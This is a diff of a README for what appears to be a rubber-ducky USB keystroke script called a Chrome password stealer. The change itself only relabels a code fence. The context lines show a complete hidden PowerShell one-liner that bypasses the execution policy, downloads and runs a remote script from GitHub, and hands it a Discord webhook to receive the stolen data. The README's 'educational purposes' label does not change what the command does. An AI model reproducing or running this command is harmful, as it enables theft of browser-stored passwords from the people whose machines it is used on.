@@ -12,7 +12,7 @@ THIS SCRIPT IS ONLY INTENDED FOR EDUCATIONAL PURPOSES
 ## The rubber ducky script
 When the grabber.dd runs it opens a powershell terminal window and enters this string:
 
-```
+```powershell
 powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1 ; powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>""
 ```
 
